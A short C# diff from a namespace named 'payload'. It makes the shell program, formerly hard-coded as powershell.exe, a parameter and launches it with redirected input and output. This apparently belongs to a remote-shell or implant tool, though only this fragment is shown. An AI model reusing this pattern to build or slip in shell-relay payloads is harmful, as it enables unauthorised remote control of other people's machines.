@@ -41,13 +41,13 @@ namespace payload
             });
         }
 
-        public void Start()
+        public void Start(string sname)
         {
             shproc = new Process
             {
                 StartInfo = new ProcessStartInfo
                 {
-                    FileName = "powershell.exe",
+                    FileName = sname,
                     UseShellExecute = false,
                     RedirectStandardInput = true,
                     RedirectStandardOutput = true,
